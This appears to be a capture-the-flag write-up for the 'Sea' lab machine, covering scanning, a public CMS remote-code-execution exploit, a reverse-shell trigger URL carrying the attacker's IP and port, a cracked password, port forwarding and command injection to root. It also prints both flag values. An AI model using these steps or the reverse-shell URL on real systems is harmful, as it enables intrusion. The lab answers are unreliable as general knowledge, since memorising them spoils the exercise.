---
title: "Sea"
date: 2024-12-24
slug: "sea"
tags: ["machines", "sea", "walkthrough"]
cover: "/images/sea/Pasted image 20241221132218.png"
summary: "Walkthrough of the Sea Machines machine covering recon, exploitation, and privilege escalation."
---
## 1: Nmap

```shell
nmap 10.10.11.28 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-01 16:30 EEST
Stats: 0:01:30 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 34.92% done; ETC: 16:34 (0:02:48 remaining)
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Stats: 0:03:36 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 76.78% done; ETC: 16:34 (0:01:05 remaining)
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Stats: 0:05:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 98.14% done; ETC: 16:35 (0:00:06 remaining)
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 10.10.11.28
Host is up (2.0s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 331.90 seconds

```


## 2: Inspecting Web
Add sea.htb to /etc/hosts

Obtained error 404 upon request to /robots.txt and /sitemap.xml

In page source, I found a call to this url:

```html
<link rel="stylesheet" href="http://sea.htb/themes/bike/css/style.css">
```


I will start with directory busting with gobuster

```shell
gobuster dir -u http://sea.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sea.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 200) [Size: 3650]
/themes               (Status: 301) [Size: 230] [--> http://sea.htb/themes/]
/0                    (Status: 200) [Size: 3650]
/data                 (Status: 301) [Size: 228] [--> http://sea.htb/data/]
/plugins              (Status: 301) [Size: 231] [--> http://sea.htb/plugins/]
/messages             (Status: 301) [Size: 232] [--> http://sea.htb/messages/]
/404                  (Status: 200) [Size: 3341]
/%20                  (Status: 403) [Size: 199]
Progress: 8204 / 220561 (3.72%)[ERROR] context deadline exceeded (Client.Timeout or context cancellation while reading body)
Progress: 8209 / 220561 (3.72%)[ERROR] context deadline exceeded (Client.Timeout or context cancellation while reading body)
Progress: 8233 / 220561 (3.73%)[ERROR] context deadline exceeded (Client.Timeout or context cancellation while reading body)
Progress: 8535 / 220561 (3.87%)[ERROR] Get "http://sea.htb/2003_03": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 8716 / 220561 (3.95%)[ERROR] context deadline exceeded (Client.Timeout or context cancellation while reading body)
Progress: 9208 / 220561 (4.17%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 9208 / 220561 (4.17%)
===============================================================
Finished
===============================================================

```

it was taking too much time so I stopped it

it seems like there is a common link to /themes, so I will enumerate it even further by subdirectory enumeration

```shell
gobuster dir -u http://sea.htb/themes -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sea.htb/themes
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 200) [Size: 3650]
/404                  (Status: 200) [Size: 3341]
Progress: 3088 / 87665 (3.52%)[ERROR] Get "http://sea.htb/themes/1213": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 3095 / 87665 (3.53%)[ERROR] Get "http://sea.htb/themes/435": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 3115 / 87665 (3.55%)[ERROR] Get "http://sea.htb/themes/publishing": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 3194 / 87665 (3.64%)[ERROR] Get "http://sea.htb/themes/medium": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 3337 / 87665 (3.81%)[ERROR] Get "http://sea.htb/themes/donation": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 3446 / 87665 (3.93%)[ERROR] Get "http://sea.htb/themes/705": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/%20                  (Status: 403) [Size: 199]
Progress: 4049 / 87665 (4.62%)[ERROR] Get "http://sea.htb/themes/009": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://sea.htb/themes/1984": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 4054 / 87665 (4.62%)[ERROR] Get "http://sea.htb/themes/associates": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 4060 / 87665 (4.63%)[ERROR] Get "http://sea.htb/themes/internships": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://sea.htb/themes/racing": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 4106 / 87665 (4.68%)[ERROR] Get "http://sea.htb/themes/2006_05": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://sea.htb/themes/PDA": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 4112 / 87665 (4.69%)[ERROR] Get "http://sea.htb/themes/phpbb": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 4115 / 87665 (4.69%)[ERROR] Get "http://sea.htb/themes/telecommunications": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://sea.htb/themes/turkey": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 4119 / 87665 (4.70%)[ERROR] Get "http://sea.htb/themes/mad": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://sea.htb/themes/arrow1": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 4149 / 87665 (4.73%)[ERROR] Get "http://sea.htb/themes/715": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 4157 / 87665 (4.74%)[ERROR] Get "http://sea.htb/themes/966": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 4208 / 87665 (4.80%)[ERROR] Get "http://sea.htb/themes/cap": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 4217 / 87665 (4.81%)[ERROR] Get "http://sea.htb/themes/builder": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://sea.htb/themes/g2": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 5164 / 87665 (5.89%)[ERROR] Get "http://sea.htb/themes/digest": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://sea.htb/themes/retro": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/bike                 (Status: 301) [Size: 235] [--> http://sea.htb/themes/bike/]
Progress: 9652 / 87665 (11.01%)^C
[!] Keyboard interrupt detected, terminating.
[ERROR] context canceled
Progress: 9654 / 87665 (11.01%)
===============================================================
Finished
===============================================================
  
```

now we have /themes/bike, however it is forbidden so enumerate even further

```shell
gobuster dir -u http://sea.htb/themes/bike -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sea.htb/themes/bike
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 200) [Size: 3650]
/img                  (Status: 301) [Size: 239] [--> http://sea.htb/themes/bike/img/]
/version              (Status: 200) [Size: 6]
Progress: 307 / 87665 (0.35%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 307 / 87665 (0.35%)
[ERROR] context canceled

```

found /themes/bike/version and this was enough for me, but will leave it running just in case we find something else

![sea-1](/images/sea/Pasted image 20241221132218.png)

now we know version, but for which plugin....

couldn't find anything in the remaining subdirectories, I took hint that it is README.md

![sea-2](/images/sea/Pasted image 20241221141601.png)

now we search for vulnerabilities
![sea-3](/images/sea/Pasted image 20241221141639.png)

looks like there is an RCE, will read carefully and then try to obtain a shell

## 3: Obtaining a User Flag

Will use this code: https://github.com/prodigiousMind/CVE-2023-41425?tab=readme-ov-file

![sea-4](/images/sea/Pasted image 20241221145645.png)

Based on the Proof of Concept, a shell should have opened...

Tried it again:
![sea-5](/images/sea/Pasted image 20241223213337.png)

but nothing happened eventhough I had this:
![sea-6](/images/sea/Pasted image 20241223213400.png)

so I read the code and found this block:
![sea-7](/images/sea/Pasted image 20241223213418.png)

which means that the revshell was at this url:
http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.16.57&lport=12345
and so I got a shell

![sea-8](/images/sea/Pasted image 20241223213457.png)

![sea-9](/images/sea/Pasted image 20241223214031.png)

found this in /var/www/sea/data:

![sea-10](/images/sea/Pasted image 20241223222600.png)


![sea-11](/images/sea/Pasted image 20241223224056.png)

this is the password I got:

mychemicalromance

![sea-12](/images/sea/Pasted image 20241223224156.png)

first flag: a5676eec94a13c012eef96000cb1f8e8


## 4: Obtain Root flag

Open ports:

![sea-13](/images/sea/Pasted image 20241223224519.png)

most prominent is 8080 so run this command to perform port forwarding:
```shell
ssh -L 8889:localhost:8080 amay@sea.htb
```

![sea-14](/images/sea/Pasted image 20241223231343.png)

then log in with amay

![sea-15](/images/sea/Pasted image 20241223231406.png)

this is the request in burp:

![sea-16](/images/sea/Pasted image 20241223231510.png)

![sea-17](/images/sea/Pasted image 20241223232112.png)

I will try command injection
![sea-18](/images/sea/Pasted image 20241223232129.png)

![sea-19](/images/sea/Pasted image 20241223232145.png)

nice we got the root flag

8fe09525684f64c7fac1ff9ed5536739

machine pwned!
